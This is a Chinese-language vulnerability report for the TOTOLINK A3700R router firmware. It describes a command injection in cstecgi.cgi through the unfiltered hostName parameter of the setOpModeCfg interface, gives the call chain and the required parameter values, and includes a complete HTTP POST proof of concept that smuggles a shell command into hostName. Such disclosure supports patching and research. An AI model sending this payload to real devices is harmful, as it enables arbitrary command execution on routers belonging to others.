

### **概述**：
影响设备：totolink A3700R

影响固件版本：V9.1.2u.6165_20211012

影响：命令注入，可以导致任意命令执行

固件下载地址：<https://download.totolink.tw/uploads/firmware/A3700R/TOTOLINK_A3700R_V9.1.2u.6165_20211012.zip>

报送邮箱 : zwx918569613@gmail.com


![](Pasted%20image%2020231022165035.png)

### **漏洞**：

该漏洞位于`cstecgi.cgi`中的函数`FUN_0042455c`
漏洞点在于没有对传入参数`hostName`进行过滤，存在命令注入，通过合适的构造，可以导致任意命令执行

![](Pasted%20image%2020231024194653.png)


`cstecgi.cgi`通过`topicurl`的值实现处理不同的函数接口
该命令注入漏洞通过`setOpModeCfg`触发
通过对`FUN_0042455c`函数的交叉引用查找，我们可以得出函数调用链
即`FUN_0042dd5c->FUN_00425770->FUN_0042455c`
其中为了进入`FUN_00425770`，我们需要控制参数`opmode`的值不为`gw`
其次在函数`FUN_0042455c`中，我们需要控制参数`proto`为非`0,3,4,6`的值才能确保能触发命令注入漏洞
控制参数`hostName`，合理构造可以导致任意命令执行

### **POC**:

复现漏洞可以通过使用真机或者使用qemu模拟
使用下方POC可以打通

~~~
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.122.15
Content-Length: 88
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.122.15
Referer: http://192.168.122.15/basic/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SESSION_ID=2:1698059537:2
Connection: close

{"topicurl":"setting/setOpModeCfg","proto":"5","opmode":"rpt","hostName":"1';ls \n"}


~~~

### **影响效果**：


![](Pasted%20image%2020231024201053.png)